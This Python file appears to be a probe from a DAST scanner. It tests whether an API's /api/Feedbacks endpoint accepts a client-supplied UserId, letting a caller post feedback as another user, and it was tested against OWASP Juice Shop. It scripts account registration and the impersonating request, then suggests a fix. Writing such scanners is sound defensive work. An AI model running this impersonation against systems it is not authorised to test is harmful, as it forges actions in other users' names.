#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Authorization: feedback UserId mass-assignment lets caller post
feedback as a different user.

`POST /api/Feedbacks` should derive UserId from the JWT subject. When
the controller .creates() the request body verbatim, the caller picks
whose name shows up next to the comment — small bug socially, with
exactly the right chained-attack shape (a CSRF that posts feedback as
the admin, an account deletion confirmation that traces to the wrong
person, etc.).

Detection signal:
  Register user A, log in. POST /api/Feedbacks with
  `{comment: <random>, rating: 5, UserId: <some_other_id>}`.
  Response's data.UserId equals the supplied other id (server did not
  override from session).

Tested against:
  + OWASP Juice Shop  /api/Feedbacks accepts UserId from the body →
                      validated=True.
  + nginx default site → validated=False
"""
from __future__ import annotations

import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

FEEDBACKS_PATH = "/api/Feedbacks"


def _register_and_login(client: SafeClient, origin: str) -> dict:
    email = f"feedback-mass-{secrets.token_hex(6)}@dast.test"
    pw    = "Pr0be-" + secrets.token_hex(4)
    out: dict = {"email": email, "password": pw,
                 "token": None, "user_id": None}
    body = json.dumps({"email": email, "password": pw,
                       "passwordRepeat": pw,
                       "securityQuestion": {"id": 1},
                       "securityAnswer": "probe"}).encode()
    r = client.request("POST", urljoin(origin, "/api/Users"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["register_status"] = r.status
    if r.status in (200, 201) and r.body:
        try:
            doc = json.loads(r.text)
            data = doc.get("data") if isinstance(doc, dict) else None
            uid = (data or {}).get("id") if isinstance(data, dict) else None
            out["user_id"] = uid
        except json.JSONDecodeError:
            pass

    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request("POST", urljoin(origin, "/rest/user/login"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            auth = doc.get("authentication") or {}
            out["token"] = auth.get("token")
            if out["user_id"] is None:
                out["user_id"] = auth.get("uid") or auth.get("id")
        except json.JSONDecodeError:
            pass
    return out


class FeedbackUserIdAssignmentProbe(Probe):
    name = "authz_feedback_userid_assignment"
    summary = ("Detects feedback UserId mass-assignment: caller can "
               "post feedback attributed to another user.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--victim-uid", type=int, default=1,
            help="UserId to impersonate via the body field (default 1).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        sess = _register_and_login(client, origin)
        if not sess.get("token"):
            return Verdict(
                validated=False, confidence=0.6,
                summary=f"Inconclusive: no probe session on {origin}.",
                evidence={"origin": origin,
                          "session": {k: v for k, v in sess.items()
                                      if k != "password"}},
            )
        token = sess["token"]
        own_uid = sess.get("user_id")
        victim = int(args.victim_uid)
        # If we happened to register as uid==victim (essentially never),
        # nudge to a different number so the assertion is meaningful.
        if own_uid is not None and own_uid == victim:
            victim = victim + 1
        comment = f"DAST probe {secrets.token_hex(4)} — please ignore."
        body = json.dumps({"comment": comment, "rating": 5,
                           "UserId": victim,
                           "captchaId": 0, "captcha": "0"}).encode()
        r = client.request("POST", urljoin(origin, FEEDBACKS_PATH),
                           headers={"Authorization": f"Bearer {token}",
                                    "Content-Type": "application/json"},
                           body=body)
        attempt = {"path": FEEDBACKS_PATH, "status": r.status,
                   "size": r.size, "victim_uid": victim, "own_uid": own_uid}
        evidence = {"origin": origin, "session_email": sess.get("email"),
                    "attempt": attempt}

        confirmed = False
        if r.status in (200, 201) and r.body:
            try:
                doc = json.loads(r.text)
                data = doc.get("data") if isinstance(doc, dict) else None
                if isinstance(data, dict):
                    rec_uid = data.get("UserId")
                    attempt["recorded_uid"] = rec_uid
                    if rec_uid == victim and (own_uid is None or rec_uid != own_uid):
                        confirmed = True
            except json.JSONDecodeError:
                pass

        if confirmed:
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: feedback UserId mass-assignment on "
                         f"{origin}{FEEDBACKS_PATH} — server stored "
                         f"UserId={victim} from the request body, "
                         f"impersonating that user."),
                evidence=evidence,
                severity_uplift="high",
                remediation=(
                    "Strip `UserId` from the accepted request schema "
                    "and set it server-side from `req.user.id`. The "
                    "client should never name whose feedback they're "
                    "submitting."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: POST /api/Feedbacks on {origin} did not "
                     "honor the foreign UserId field."),
            evidence=evidence,
        )


if __name__ == "__main__":
    FeedbackUserIdAssignmentProbe().main()
